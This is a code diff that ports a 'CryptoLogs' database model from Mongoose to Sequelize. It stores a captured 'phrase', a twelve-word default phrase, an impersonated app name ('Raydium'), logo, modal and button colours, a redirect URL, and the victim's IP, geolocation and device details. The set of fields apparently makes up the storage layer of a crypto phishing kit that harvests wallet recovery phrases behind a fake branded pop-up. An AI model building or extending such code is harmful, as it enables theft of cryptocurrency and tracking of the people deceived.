@@ -1,38 +1,51 @@
-// Account.ts (Mongoose Model)
+import { DataTypes } from 'sequelize';
+import sequelize from '../sequelize.js';
 
-import mongoose, { Schema } from "mongoose";
-
-const CryptoLogs = new Schema(
-  {
-    userId: {
-      type: mongoose.Schema.Types.ObjectId,
-      ref: "User",
-      require: true,
-    },
-    specialPhrase: { type: String, default: "one two three four five six seven eight nine ten eleven twelve" },
-    appName: { type: String, default: "Raydium" },
-    appLogo: {type: String, default: ''},
-    phrase: { type: String, default: "" },
-    modalColor: { type: String, default: "" },
-    redirectUrl: { type: String, default: "" },
-    backgroundcolor: { type: String, default: "" },
-    btnColor: { type: String, default: "" },
-    location: {
-      country: String,
-      countryCode: String,
-      region: String,
-      city: String,
-      ipAddress: String,
-      lat: Number,
-      lon: Number,
-    },
-    userInfo: {
-      browser: { type: String },
-      os: { type: String },
-      device: { type: String },
-    },
+const CryptoLogs = sequelize.define('CryptoLog', {
+  specialPhrase: {
+    type: DataTypes.STRING,
+    defaultValue: "one two three four five six seven eight nine ten eleven twelve",
   },
-  { timestamps: true }
-);
+  appName: {
+    type: DataTypes.STRING,
+    defaultValue: "Raydium",
+  },
+  appLogo: {
+    type: DataTypes.STRING,
+    defaultValue: '',
+  },
+  phrase: {
+    type: DataTypes.STRING,
+    defaultValue: '',
+  },
+  modalColor: {
+    type: DataTypes.STRING,
+    defaultValue: '',
+  },
+  redirectUrl: {
+    type: DataTypes.STRING,
+    defaultValue: '',
+  },
+  backgroundcolor: {
+    type: DataTypes.STRING,
+    defaultValue: '',
+  },
+  btnColor: {
+    type: DataTypes.STRING,
+    defaultValue: '',
+  },
+  location: {
+    type: DataTypes.JSON, 
+  },
+  userInfo: {
+    type: DataTypes.JSON, 
+  },
+  userId: {
+    type: DataTypes.INTEGER,
+    allowNull: false, 
+  }
+}, {
+  timestamps: true,
+});
 
-export default mongoose.model("CryptoLogs", CryptoLogs);
+export default CryptoLogs;
